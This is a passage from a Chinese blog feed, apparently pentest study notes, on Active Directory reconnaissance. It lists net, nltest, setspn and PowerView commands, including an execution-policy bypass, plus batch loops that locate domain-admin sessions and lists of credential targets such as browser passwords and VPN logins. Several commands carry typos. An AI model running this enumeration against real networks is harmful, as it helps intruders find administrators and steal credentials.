+</tbody></table>
+<h2 id="6-收集域内基础信息"><a href="#6-收集域内基础信息" class="headerlink" title="6 收集域内基础信息"></a>6 收集域内基础信息</h2><h3 id="6-1-查询域名"><a href="#6-1-查询域名" class="headerlink" title="6.1 查询域名"></a>6.1 查询域名</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net view &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-查询域内所有计算机"><a href="#6-2-查询域内所有计算机" class="headerlink" title="6.2 查询域内所有计算机"></a>6.2 查询域内所有计算机</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net view &#x2F;domain:hack</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-查询域内所有用户列表"><a href="#6-3-查询域内所有用户列表" class="headerlink" title="6.3 查询域内所有用户列表"></a>6.3 查询域内所有用户列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p>系统常见用户身份如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">domain admins:域管理员</span><br><span class="line">domain computers :域内机器</span><br><span class="line">domain controllers:域控制器</span><br><span class="line">domain guest：域访客，权限较低</span><br><span class="line">domain users：域用户</span><br><span class="line">domain admins：企业系统管理员用户</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-4-查询域内所有计算机列表"><a href="#6-4-查询域内所有计算机列表" class="headerlink" title="6.4 查询域内所有计算机列表"></a>6.4 查询域内所有计算机列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-5-获取域密码信息"><a href="#6-5-获取域密码信息" class="headerlink" title="6.5 获取域密码信息"></a>6.5 获取域密码信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net accouts &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-6-获取域信任信息"><a href="#6-6-获取域信任信息" class="headerlink" title="6.6 获取域信任信息"></a>6.6 获取域信任信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nltest &#x2F;domain_trusts</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-7-获取DC机器名"><a href="#6-7-获取DC机器名" class="headerlink" title="6.7 获取DC机器名"></a>6.7 获取DC机器名</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nltest &#x2F;DCLIST:hack</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-8-查看域控制器组"><a href="#6-8-查看域控制器组" class="headerlink" title="6.8 查看域控制器组"></a>6.8 查看域控制器组</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net view &quot;domain controllers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-9-查询域用户"><a href="#6-9-查询域用户" class="headerlink" title="6.9 查询域用户"></a>6.9 查询域用户</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-10-查询本地管理员组用户"><a href="#6-10-查询本地管理员组用户" class="headerlink" title="6.10 查询本地管理员组用户"></a>6.10 查询本地管理员组用户</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net localgroup adminstrators</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-查找域控制器"><a href="#7-查找域控制器" class="headerlink" title="7 查找域控制器"></a>7 查找域控制器</h2><h3 id="7-1-查看域控制器的机器名"><a href="#7-1-查看域控制器的机器名" class="headerlink" title="7.1 查看域控制器的机器名"></a>7.1 查看域控制器的机器名</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nltest &#x2F;DCLIST:域名</span><br></pre></td></tr></table></figure>
+
+<p>更多命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdom query PDC</span><br><span class="line"></span><br><span class="line">netdom query查询信息命令的常用语法是:</span><br><span class="line">&#x2F;Domain 指定要查询信息的域</span><br><span class="line">&#x2F;UserD 用于与 &#x2F;Domain 参数指定的域建立连接的用户帐户</span><br><span class="line">&#x2F;PasswordD &#x2F;UserD 指定的用户帐户的密码。* 表示提示输入密码</span><br><span class="line">&#x2F;Server 用于执行查询的特定域控制器的名称。</span><br><span class="line">&#x2F;Verify 对于计算机，验证计算机和域控制器之间的安全通道是否正常运行。对于信任，验证域之间的信任是否正常运行。仅验证出站信任。用户必须使用域管理员凭据来获取正确的验证结果。</span><br><span class="line">&#x2F;Direct 仅应用于信任查询，仅列出直接信任链接并忽略通过可传递链接间接信任的域。请勿与 &#x2F;Verify 一起使用。</span><br><span class="line"></span><br><span class="line">WORKSTATION 在域中查询工作站列表</span><br><span class="line">SERVER 在域中查询服务器列表</span><br><span class="line">DC 在域中查询域控制器列表</span><br><span class="line">OU 在域中查询特定用户可在其中创建计算机对象的组织单位的列表</span><br><span class="line">PDC 在域中查询当前的主域控制器</span><br><span class="line">FSMO 在域中查询当前 FSMO 所有者的列表</span><br><span class="line">TRUST 在域中查询其信任的列表</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-查看域控主机名"><a href="#7-2-查看域控主机名" class="headerlink" title="7.2 查看域控主机名"></a>7.2 查看域控主机名</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup -type&#x3D;SRV _ldap._tcp</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-3-查看域控时间"><a href="#7-3-查看域控时间" class="headerlink" title="7.3 查看域控时间"></a>7.3 查看域控时间</h3><p>通常域时间服务器为主域控制器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-4-查看与控制器组成员"><a href="#7-4-查看与控制器组成员" class="headerlink" title="7.4 查看与控制器组成员"></a>7.4 查看与控制器组成员</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p>实际网络中，一个域内通常有两台或两台以上的域控制器存在，目的是一旦主域控制器发生故障，备用的域控制器可以保证域内的服务和验证工作正常进行。</p>
+<h2 id="8-获取域内的用户和管理员信息"><a href="#8-获取域内的用户和管理员信息" class="headerlink" title="8 获取域内的用户和管理员信息"></a>8 获取域内的用户和管理员信息</h2><h3 id="8-1-查询所有域用户列表"><a href="#8-1-查询所有域用户列表" class="headerlink" title="8.1 查询所有域用户列表"></a>8.1 查询所有域用户列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain    #向域控制器进行查询</span><br><span class="line">wmic useraccount get &#x2F;all    #获取域内用户的详细信息</span><br><span class="line">dsquery user    #查看存在的用户</span><br><span class="line">net localgroup administrators    #查询本地管理员组</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-2-查询域管理员用户组"><a href="#8-2-查询域管理员用户组" class="headerlink" title="8.2 查询域管理员用户组"></a>8.2 查询域管理员用户组</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; &#x2F;domain    #查询域管理员用户</span><br><span class="line">net group &quot;Enterprise Admins&quot; &#x2F;domain    #查询管理员用户组</span><br></pre></td></tr></table></figure>
+
+<h2 id="9-定位域管理员"><a href="#9-定位域管理员" class="headerlink" title="9 定位域管理员"></a>9 定位域管理员</h2><h3 id="9-1-psloggedon-exe"><a href="#9-1-psloggedon-exe" class="headerlink" title="9.1 psloggedon.exe"></a>9.1 psloggedon.exe</h3><p>下载链接 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p>
+<p>此工具用于查看本地登录的用户和通过本地计算机或远程计算机资源登录的用户</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psloggedon.exe [-] [-l] [-x] [\\computername或username]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">常用参数有：</span><br><span class="line"></span><br><span class="line">-：显示支持的选项和用于输出的单位</span><br><span class="line">-1：仅显示本地登录不显示本地和网络资源登录</span><br><span class="line">-x：不显示登录时间</span><br><span class="line">\computer：指定要列出登录信息的计算机名称</span><br><span class="line">username：指定用户名，在网络中搜索该用户登录的计算机</span><br></pre></td></tr></table></figure>
+
+<p>\\后面接的是域控机器名，看一下登录过域控的用户名</p>
+<p>如果\\接的是用户名，那就会搜索网上邻居的计算机，并显示当前用户是否已经登录</p>
+<h3 id="9-2-PVEFindADUser-exe"><a href="#9-2-PVEFindADUser-exe" class="headerlink" title="9.2 PVEFindADUser.exe"></a>9.2 PVEFindADUser.exe</h3><p>下载链接 <a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn" target="_blank" rel="noopener">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p>
+<p>功能也是查找域用户位置、某计算机上登录用户。运行需要计算机支持framework2.0且以管理员权限运行</p>
+<p>直接pvefinaduser.exe -current，一把梭，即可查看域中所有计算机的登录用户</p>
+<h3 id="9-3-netview-exe"><a href="#9-3-netview-exe" class="headerlink" title="9.3 netview.exe"></a>9.3 netview.exe</h3><p>工具下载地址：<a href="https://github.com/mubix/netview" target="_blank" rel="noopener">https://github.com/mubix/netview</a></p>
+<p>netview.exe 是一个枚举工具，使用WinAPI枚举系统、利用NetSessionEnum 找寻登录会话利用NetShareEnum 找寻共享，利用NerWkstaUserEnum 枚举登录的用户。同时，netview.exe 能够查询共享入口和有价值的用户。绝大部分功能不需要管理员权限。</p>
+<p>常用参数：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-f filename.txt：指定要提取主机名列表的文件</span><br><span class="line">-e filename.txt：指定要排除的主机名的文件</span><br><span class="line">-o filename.txt：将所有输出重定向到指定文件</span><br><span class="line">-d domain：指定要提取主机列表的域。如果没有指定，则从当前域中提取</span><br><span class="line">-g group：指定搜索的组名。如果没有指定，则在Domain Admins组中搜索</span><br><span class="line">-c：对已找到的共享目录&#x2F;文件的访问权限进行检查</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-4-Namp的NSE脚本"><a href="#9-4-Namp的NSE脚本" class="headerlink" title="9.4 Namp的NSE脚本"></a>9.4 Namp的NSE脚本</h3><p>工具下载地址：<a href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html" target="_blank" rel="noopener">https://nmap.org/nsedoc/scripts/smb-enum-sessions.html</a></p>
+<p>如果存在域账户或者本地账户就可以使用Nmap的smb-enum-sessions.nes引擎获取远程机器的登录会话。</p>
+<p>常用参数：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb-enum-domain：对域控制器进行信息收集，可以获取主机的信息、用户、可使用密码策略的用户等</span><br><span class="line">smb-enum-users：在进行域渗透测试时，如果获得了域内某台主机的权限，无法获取更多的域用户信息，就可以借助这个脚本对域控制器进行扫描</span><br><span class="line">smb-enum-shares：遍历远程主机的共享目录</span><br><span class="line">smb-enum-processes：对主机的系统进行遍历。通过这些信息，可以知道目标主机上正在运行哪些软件。</span><br><span class="line">smb-enum-sessions：获取域内主机的用户登录会话，查看当前是否有用户登录。</span><br><span class="line">smb-os-discovery：收集目标主机的操作系统、计算机名、域名域林名称、NetBIOS机器名、NetBIOS域名，工作组、系统时间等信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-5-PowerView-PS1脚本"><a href="#9-5-PowerView-PS1脚本" class="headerlink" title="9.5 PowerView.PS1脚本"></a>9.5 PowerView.PS1脚本</h3><p>工具下载地址：<a href="https://github.com/PowerShellEmpirc/PowerTools/tree/master/PowerView" target="_blank" rel="noopener">https://github.com/PowerShellEmpirc/PowerTools/tree/master/PowerView</a></p>
+<p>powerview脚本可以用来获取当前域管理员在线登录的服务器</p>
+<p>Invoke-UserHunter：搜索本地域中域管理员当前在线的主机，并验证当前用户是否具有对这些主机的本地管理员访问权限。它可以使用 Get-NetSessions 和Get-NetLoggedon 扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，并且无需管理员权限。</p>
+<p>打开powershell，进入脚本目录，输入Import-Module .\PowerView.ps1 导入脚本</p>
+<p>然后输入Invoke-UserHunter即可</p>
+<p>详细使用方法如下：</p>
+<p>Import-Module为powershell导入脚本命令，这里假设我们下载的powerview.ps1脚本在C:\PowerView.ps1<br>命令格式：powershell.exe -exec bypass -Command “&amp; {Import-Module C:\PowerView.ps1; powerview的命令参数}”</p>
+<p>定位域管理员<br>powershell.exe -exec bypass -Command “&amp; {Import-Module C:\PowerView.ps1; Invoke-UserHunter}”</p>
+<p>更多PowerView命令参数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-NetDomain: 获取当前用户所在域的名称</span><br><span class="line">Get-NetUser: 获取所有用户的详细信息</span><br><span class="line">Get-NetDomainController: 获取所有域控制器的信息</span><br><span class="line">Get-NetComputer: 获取域内所有机器的详细信息</span><br><span class="line">Get-NetOU: 获取域中的OU信息</span><br><span class="line">Get-NetGroup: 获取所有域内组和组成员信息</span><br><span class="line">Get-NetFileServer: 根据SPN获取当前域使用的文件服务器信息</span><br><span class="line">Get-NetShare: 获取当前域内所有网络共享信息</span><br><span class="line">Get-NetSession: 获取指定服务器的会话</span><br><span class="line">Get-NetRDPSession: 获取指定服务器的远程连接</span><br><span class="line">Get-NetProcess: 获取远程主机的进程</span><br><span class="line">Get-UserEvent: 获取指定用户的日志</span><br><span class="line">Get-ADObiect: 获取活动目录的对象</span><br><span class="line">Get-NetGPO: 获取域内所有的组策略对象</span><br><span class="line">Get-DomainPolicy: 获取域默认策略或域控制器策略</span><br><span class="line">Invoke-UserHunter: 获取域用户登录的计算机信息及该用户是否有本地管理员权限</span><br><span class="line">Invoke-ProcessHunter: 通过查询域内所有的机器进程找到特定用户</span><br><span class="line">Invoke-UserEvenHunter: 根据用户日志查询某域用户登录过哪些域机器。</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-6-SPN扫描"><a href="#9-6-SPN扫描" class="headerlink" title="9.6 SPN扫描"></a>9.6 SPN扫描</h3><p>不同于常规的tcp/udp端口扫描，由于spn本质就是正常的Kerberos请求，所以扫描是非常隐蔽，日前针对此类扫描的检测暂时也比较少。</p>
+<p>大部分win系统默认已自带spn探测工具即：setspn.exe</p>
+<p>此操作无需管理权限</p>
+<p>域内机器执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn -T 域名 -Q *&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p>即可完整查出当前域内所有spn。</p>
+<h2 id="10-查找域管理进程"><a href="#10-查找域管理进程" class="headerlink" title="10 查找域管理进程"></a>10 查找域管理进程</h2><h3 id="10-1-本机检查"><a href="#10-1-本机检查" class="headerlink" title="10.1 本机检查"></a>10.1 本机检查</h3><ul>
+<li>获取域管理员列表</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net group <span class="string">"Domain Admins"</span> /domain</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>列出本机的所有进程及进程用户</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tasklist  /v</span><br></pre></td></tr></table></figure>
+
+<h3 id="10-2-查询域控制器的域用户会话"><a href="#10-2-查询域控制器的域用户会话" class="headerlink" title="10.2 查询域控制器的域用户会话"></a>10.2 查询域控制器的域用户会话</h3><ul>
+<li>查询域控制器列表</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net group <span class="string">"Domain Controllers"</span> /domain</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>收集域管理员列表</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net group <span class="string">"Domain Admins"</span> /domain</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>收集所有活动域的会话列表</li>
+</ul>
+<p>使用netsess.exe查询每个域控制器，收集所有活动域会话列表。netsess.exe是一个很棒的工具，它包含本地windows函数netsessionenum。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NetSess -h</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>交叉引用域管理员列表与活动会话列表</li>
+</ul>
+<p>对域管理员列表和活动会话列表进行交叉引用，可以确定那些IP地址有活动域令牌。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net localgroup <span class="string">"Domain Controllers"</span> /domain &gt; dcs.txt</span><br><span class="line">net localgroup <span class="string">"Domian Admins"</span> /domain &gt; admins.txt</span><br></pre></td></tr></table></figure>
+
+
+<p>然后运行一下脚本，会在当前目录下生成一个文本文件sessions.txt</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR &#x2F;F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;null &gt;sessions.txt &amp;&amp; FOR &#x2F;F %a in (admins.txt) DO @type sessions.txt | @findstr &#x2F;I %a</span><br></pre></td></tr></table></figure>
+
+<h3 id="10-3-查询远程系统中运行的任务"><a href="#10-3-查询远程系统中运行的任务" class="headerlink" title="10.3 查询远程系统中运行的任务"></a>10.3 查询远程系统中运行的任务</h3><p>如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以使用下列脚本来查询系统中的域管理任务。<br>首先，从Domain Admins组中收集域管理员列表。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net group <span class="string">"Domain Admins"</span> /domain &gt; admins.txt</span><br><span class="line">net group <span class="string">"Domain Controllers"</span> /domain &gt; dcs.txt</span><br></pre></td></tr></table></figure>
+
+<p>然后，运行如下脚本，将目标域系统列表添加到ips.txt文件中，将收集的域管理员列表添加到names.txt文件中。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR &#x2F;F %i in (dcs.txt) DO @echo [+] %i &amp;&amp; @tasklist &#x2F;V &#x2F;S %i &#x2F;U user &#x2F;P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR &#x2F;F %n in (admins.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</span><br></pre></td></tr></table></figure>
+
+<h3 id="10-4-扫描远程系统的NetBIOS信息"><a href="#10-4-扫描远程系统的NetBIOS信息" class="headerlink" title="10.4 扫描远程系统的NetBIOS信息"></a>10.4 扫描远程系统的NetBIOS信息</h3><p>某些版本的Windows操作系统允许用户通过NetBIOS查询已登录用户。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net group <span class="string">"Domain Admins"</span> /domain &gt; admins.txt</span><br><span class="line">net group <span class="string">"Domain Controllers"</span> /domain &gt; dcs.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;F %i in (dcs.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR &#x2F;F %n in (admins.txt) DO @type nbsessions.txt | findstr &#x2F;I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure>
+
+<p>使用nbtscan工具，就文件与nbtscan工具置于同一目录下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;F %i in (dcs.txt) do @echo [+] Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR &#x2F;F %n in (admins.txt) DO @type nbsessions.txt | findstr &#x2F;I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure>
+
+<h2 id="11-利用powershell收集域信息"><a href="#11-利用powershell收集域信息" class="headerlink" title="11 利用powershell收集域信息"></a>11 利用powershell收集域信息</h2><h3 id="11-1-权限类型"><a href="#11-1-权限类型" class="headerlink" title="11.1 权限类型"></a>11.1 权限类型</h3><p>powershell的执行权限共有四种：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Restricted：默认的设置，不允许任何脚本的运行</span><br><span class="line">AllSigned：只能运行经过数字证书签名的脚本</span><br><span class="line">RemoteSigned：运行本地的脚本不需要数字签名，但运行从网络下下载的脚本就必须要有数字签名</span><br><span class="line">Unrestricted：允许所有的脚本运行。</span><br></pre></td></tr></table></figure>
+
+<p>权限修改方式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy -ExecutionPolicy Unrestricted</span><br></pre></td></tr></table></figure>
+
+<h3 id="11-2-PowerView"><a href="#11-2-PowerView" class="headerlink" title="11.2 PowerView"></a>11.2 PowerView</h3><p>PowerView是一款依赖PowerShell和WMI对内网进行查询的常用渗透测试脚本，它集成在PowerSploit工具包中。</p>
+<p>PowerView的下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" target="_blank" rel="noopener">PowerView</a></p>
+<p>首先我们要做的就是导入PowerView脚本。</p>
+<p>命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br></pre></td></tr></table></figure>
+
+<p>PowerView的常用命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-NetDomain 获取当前用户所在域的名称</span><br><span class="line">Get-NetUser 获取所有用户的详细信息</span><br><span class="line">Get-NetDomainController 获取所有域控制器的信息</span><br><span class="line">Get-NetComputer 获取域内所有机器的详细信息</span><br><span class="line">Get-NetPrinter 获取域中所有当前计算机对象的数组</span><br><span class="line">Get-NetOU 获取域内的OU信息</span><br><span class="line">Get-NetGroup 获取所有域内组和组成员的信息</span><br><span class="line">Get-NetGroupMember 获取指定域组中所有当前用户的列表</span><br><span class="line">Get-NetFileServer 根据SPN获取当前域使用的文件服务器信息</span><br><span class="line">Get-NetShare 获取当前域内所有的网络共享信息</span><br><span class="line">Get-DFSshare 获取域上所有分发文件系统共享的列表</span><br><span class="line">Get-NetSubnet 获取域的其他网段</span><br><span class="line">Get-NetSite 获取域内的当前站点</span><br><span class="line">Get-NetDomainTrust 获取当前用户域的所有信任</span><br><span class="line">Get-NetForestTrust 获取与当前用户的域关联的林的所有信任</span><br><span class="line">Find-ForeignUser 枚举在其主域之外的组中的用户</span><br><span class="line">Find-ForeignGroup 枚举域组的所有成员并查找查询域之外的用户</span><br><span class="line">Invoke-MapDomainTrust 尝试构建所有域信任的关系映射</span><br><span class="line">Get-NetLoggedon 获取主动登录到指定服务器的用户</span><br><span class="line">Get-NetLocalGroup 获取一个或多个远程主机上本地组的成员</span><br><span class="line">Get-NetSession 获取指定服务器的会话</span><br><span class="line">Get-NetRDPSession 获取指定服务器的远程连接</span><br><span class="line">Get-NetProcess 获取远程主机的进程</span><br><span class="line">Get-UserEvent 获取指定用户的日志</span><br><span class="line">Get-ADObject 获取活动目录的对象</span><br><span class="line">Get-NetGPO 获取域内所有的组策略对象</span><br><span class="line">Get-NetGPOGroup 获取域中设置”受限组”的所有GPO</span><br><span class="line">Find-GPOLocation 获取用户&#x2F;组，并通过GPO枚举和关联使其具有有效权限的计算机</span><br><span class="line">Find-GPOComputerAdmin 获取计算机并通过GPO枚举确定谁对其具有管理权限</span><br><span class="line">Get-DomainPolicy 获取域默认策略或域控制器策略</span><br><span class="line">Get-DomainSID 返回指定域的SID</span><br><span class="line">Invoke-UserHunter 获取域用户登录的计算机信息及该用户是否有本地管理员权限</span><br><span class="line">Invoke-ProcessHunter 通过查询域内所有的机器进程找到特定用户</span><br><span class="line">Invoke-UserEventHunter 根据用户日志查询某域用户登陆过哪些域机器</span><br><span class="line">Invoke-ShareFinder 在本地域中的主机上查找（非标准）共享</span><br><span class="line">Invoke-FileFinder 在本地域中的主机上查找潜在的敏感文件</span><br><span class="line">Find-LocalAdminAccess 在域上查找当前用户具有本地管理员访问权限的计算机</span><br><span class="line">Find-ManagedSecurityGroups 搜索受管理的活动目录安全组并标识对其具有写访问权限的用户，即这些组拥有添加或删除成员的能力</span><br><span class="line">Get-ExploitableSystem 发现系统可能易受常见攻击</span><br><span class="line">Invoke-EnumerateLocalAdmin 枚举域中所有计算机上本地管理员组的成员</span><br></pre></td></tr></table></figure>
+
+<h2 id="12-敏感数据防护"><a href="#12-敏感数据防护" class="headerlink" title="12 敏感数据防护"></a>12 敏感数据防护</h2><p>内网的核心敏感数据，不仅包括数据库、电子邮件，还包括个人数据及组织的业务数据、技术数据等。</p>
+<h3 id="12-1-文件定位流程"><a href="#12-1-文件定位流程" class="headerlink" title="12.1 文件定位流程"></a>12.1 文件定位流程</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">定位内部人事组织结构；</span><br><span class="line">在内部人事组织结构中寻找需要监视的人员；</span><br><span class="line">定位相关人员的机器；</span><br><span class="line">监视相关人员存放文档的位置；</span><br><span class="line">列出存放文档的服务器的目录。</span><br></pre></td></tr></table></figure>
+
+<h3 id="12-2-核心业务机器"><a href="#12-2-核心业务机器" class="headerlink" title="12.2 核心业务机器"></a>12.2 核心业务机器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">核心业务机器</span><br><span class="line">高管&#x2F;系统管理员&#x2F;财务&#x2F;人事&#x2F;业务人员的个人计算机。</span><br><span class="line">产品管理系统服务器（仓库管理系统） 。</span><br><span class="line">OA 办公系统服务器。</span><br><span class="line">财务应用系统服务器。</span><br><span class="line">核心产品源码服务器（对于 IT公司，会架设自己的 SVN 或者 GIT 服务器） 。</span><br><span class="line">数据库服务器。</span><br><span class="line">文件服务器&#x2F;共享服务器。</span><br><span class="line">邮件服务器。</span><br><span class="line">网络监控系统服务器。</span><br><span class="line">其他服务器（分公司、工厂）。</span><br></pre></td></tr></table></figure>
+
+<h3 id="12-3-敏感信息及文件"><a href="#12-3-敏感信息及文件" class="headerlink" title="12.3 敏感信息及文件"></a>12.3 敏感信息及文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">站点源码备份文件、数据库备份文件等；</span><br><span class="line">各类数据库的Web管理入口，例如phpMyAdmin、Adminer；</span><br><span class="line">浏览器密码和浏览器Cookie；</span><br><span class="line">其他用户会话、3389和ipc$连接记录、回收站文件；</span><br><span class="line">无线密码；</span><br><span class="line">网络内部账号和密码，包括电子邮箱、VPN、FTP、TeamView等。</span><br></pre></td></tr></table></figure>
+
+<p>防护应用和配置文件，需要考虑：</p>
+<p>命名空间隔离的安全、控制组资源控制的安全、内核能力机制。</p>
+<h2 id="13-分析域内网段划分情况及拓扑图结构"><a href="#13-分析域内网段划分情况及拓扑图结构" class="headerlink" title="13 分析域内网段划分情况及拓扑图结构"></a>13 分析域内网段划分情况及拓扑图结构</h2><h3 id="13-1-基本架构"><a href="#13-1-基本架构" class="headerlink" title="13.1 基本架构"></a>13.1 基本架构</h3><p>我们还需要对目标网站的基本情况进行简单的判断，分析目标服务器所使用的Web服务器、后端脚本、数据库、系统平台等。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ASP + Access + IIS 5.0&#x2F;6.0 + Windows Sever 2003</span><br><span class="line">ASPX + MSSQL + IIS 7.0&#x2F;7.5 + Windows Sever 2008</span><br><span class="line">PHP + MySQL + IIS</span><br><span class="line">PHP + MySQL + Apache</span><br><span class="line">PHP + MySQL + Ngnix</span><br><span class="line">JSP + MySQL + Ngnix</span><br><span class="line">JSP + MSSQL + Tomcat</span><br><span class="line">JSP + Oracle + Tomcat</span><br></pre></td></tr></table></figure>
+
+<h3 id="13-2-域内网划分"><a href="#13-2-域内网划分" class="headerlink" title="13.2 域内网划分"></a>13.2 域内网划分</h3><h4 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h4><p>在实际的渗透测试中，大多数情况下，在外围 Web 中拿到的权限都在 DMZ 区。这个区域不属于严格意义上的内网。如果 DMZ 区域访问控制策略配置合理，DMZ 区会处在内网能够访问 DMZ 区而 DMZ 区访问不了内网区的状态。</p>
+<h4 id="办公区"><a href="#办公区" class="headerlink" title="办公区"></a>办公区</h4><p>办公区，顾名思义，是指公司员工日常的工作区。办公区的安全防护水平一般不是高，基本 防护机制大多为杀毒软件或主机入侵检测产品。在实际应用中，攻击者在获取权限后，利用内网 信任关系，很容易扩大攻击面。一般情况下，攻击者很少会直接到达办公区。攻击者如果想进入 办公区，可能会使用鱼叉攻击、水坑攻击或者社会工程学等手段。办公区按照系统可分为 OA 系统、邮件系统、财务系统、文件共享系统、域控、企业版杀毒 系统、内部应用监控系统、运维管理系统等，按照网络段可分为域管理网段、内部服务器系统网 段、各部门分区网段等。</p>
+<h4 id="核心区"><a href="#核心区" class="headerlink" title="核心区"></a>核心区</h4><p>核心区一般存放企业最重要的数据、文档等信息资产，如域控制器、核心生产机器等，安全 设置也最为严格。根据目标开展的业务不同，相关服务器可能存在于不同的网段上。通过分析服 务器上运行的服务和进程，可以推断出目标主机使用的运维监控管理系统和安全防护系。在内网 中横向移动时，会优先查找这些主机。核心区按照系统可分为业务系统、运维监控系统、安全系统等，按照网络段可分为各不同的 业务网段、运维监控网段、安全管理网段等。</p>
+<p>通过获取的目标主机及所在域的各类信息，就可以绘制内网的拓扑结构图，在后续的渗透测 试中，对照拓扑图可以更快地了解目标域网内部环境，准确定位内网具体目标。</p>
 ]]></content>
       <categories>
-        <category>工具</category>
+        <category>内网</category>
       </categories>
       <tags>
-        <tag>burpsuite</tag>
+        <tag>内网</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>构建内网环境</title>
+    <url>/2022/04/10/1.3%20%E6%9E%84%E5%BB%BA%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83/</url>
